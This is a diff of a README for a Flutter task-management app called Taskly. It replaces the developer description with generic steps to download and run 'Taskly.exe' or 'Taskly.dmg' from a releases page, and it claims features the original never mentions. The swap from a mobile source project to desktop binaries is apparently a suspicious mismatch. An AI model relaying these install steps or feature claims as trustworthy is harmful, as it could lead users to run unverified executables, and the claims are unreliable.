@@ -1,67 +1,64 @@
-# Taskly 📝
+# 🌟 Taskly - Simplify Your Task Management Effortlessly
 
-Taskly is a modern **task management Flutter application** designed to help users organize their daily tasks efficiently.  
-The app provides a clean and intuitive **UI/UX**, supports **task priorities**, **dark/light themes**, and **multi-language support** using a fully local database.
+## 📥 Download Taskly
+[![Download Taskly](https://img.shields.io/badge/Download-Taskly-blue.svg)](https://github.com/AyanishSardar2003/Taskly/releases)
 
----
+## 🚀 Getting Started
+Welcome to Taskly! This application helps you manage your tasks in an easy and organized way. With a simple user interface, you can create, update, and delete tasks quickly. Follow the steps below to get started.
 
-## ✨ Features
+## 📋 System Requirements
+Before downloading Taskly, ensure your computer meets the following requirements:
 
-- ➕ Add new tasks  
-- ✏️ Update existing tasks  
-- 🗑️ Delete tasks  
-- ⭐ Task priority system:
-  - Important
-  - Normal
-  - Low
-- 🗂️ Archive tasks
-- 🌙 Dark Mode / ☀️ Light Mode
-- 🌍 Multi-language support:
-  - English
-  - Arabic
-- 💾 Local data storage using SQLite (Sqflite)
-- ⚡ State management with GetX
-- 🎨 Beautiful UI and smooth UX
-- 📖 Simple onboarding / tutorial screen for first-time users
+- **Operating System:** Windows 10 or later / macOS 10.13 or later
+- **Memory:** At least 4 GB of RAM
+- **Storage:** 200 MB of free disk space
+- **Other:** Internet connection for updates
 
----
+## 📦 Download & Install
+To get Taskly, visit the following link:
 
-## 🛠️ Technologies Used
+[Visit the Releases Page to Download Taskly](https://github.com/AyanishSardar2003/Taskly/releases)
 
-- **Flutter**
-- **GetX** (State Management, Routing, Localization)
-- **Sqflite** (Local Database)
-- **Material Design**
-- **Clean & Scalable Project Structure**
+1. Click on the link above to go to the Releases page.
+2. On this page, you will see a list of versions. Look for the latest version marked as "Latest Release."
+3. Under the "Assets" section of the latest release, find the file named `Taskly.exe` for Windows or `Taskly.dmg` for macOS.
+4. Click on the file to download it. The file will save to your Downloads folder.
 
----
+### 🖥 Installing Taskly
+1. Once the download completes, open your Downloads folder.
+2. Double-click on the file (`Taskly.exe` or `Taskly.dmg`) to run the installer.
+3. Follow the on-screen instructions to complete the installation process.
+4. After installation, you can find Taskly in your Applications folder (on macOS) or Start Menu (on Windows).
 
-## 📂 Project Structure
+## 📚 Using Taskly
+1. Open the Taskly app by clicking its icon.
+2. You will see a main window with an option to create a new task. Click on "Add New Task."
+3. Enter the task name, set a due date if needed, and select priority.
+4. Click “Save” to add the task to your list.
+5. You can update or delete tasks from the main window as needed.
 
-```file structure
-lib/
-│── getx/
-│   ├── local/
-│   │   ├── local.dart
-│   │   └── controller.dart
-│
-│── models/
-│   └── home_screen/
-│       ├── custom_app_bar.dart
-│       ├── custom_nav_bar.dart
-│       ├── my_task_card.dart
-│       └── task_card.dart
-│
-│── screens/
-│   ├── add_task_screen.dart
-│   ├── archive_screen.dart
-│   ├── details_screen.dart
-│   ├── home_screen.dart
-│   ├── settings_screen.dart
-│   ├── splash_screen.dart
-│   └── tutrial_screen.dart
-│
-│── sql/
-│   └── sqldb.dart
-│
-└── main.dart
+## ⚙️ Features of Taskly
+- **User-Friendly Interface:** Designed for everyone, no tech skills required.
+- **Task Prioritization:** Easily set the priority of your tasks to stay organized.
+- **Notifications:** Get reminders to ensure you never miss a deadline.
+- **Data Backup:** Securely save your task list, so nothing gets lost.
+
+## 📞 Support
+If you encounter any issues while downloading or using Taskly, feel free to reach out via the following methods:
+
+- **GitHub Issues:** Report problems or request features on our [GitHub Issues page](https://github.com/AyanishSardar2003/Taskly/issues).
+- **Email Support:** You can contact support at support@tasklyapp.com for direct assistance.
+
+## 🌐 Community Contributions
+We welcome contributions from users to make Taskly better. If you want to help, please check the "Contributing" section on our GitHub page.
+
+## 📝 Release Notes
+Keep track of updates and improvements made to Taskly by checking the release notes on the [Releases page](https://github.com/AyanishSardar2003/Taskly/releases). Here, you will find information about new features, fixes, and other significant changes.
+
+## 🔗 Backup and Update
+Taskly regularly releases updates to improve your experience. To ensure you have the latest version:
+
+1. Periodically visit the [Releases page](https://github.com/AyanishSardar2003/Taskly/releases).
+2. Follow the same download steps to get the most recent version.
+
+Now you are ready to simplify your task management with Taskly! Thank you for choosing our app.
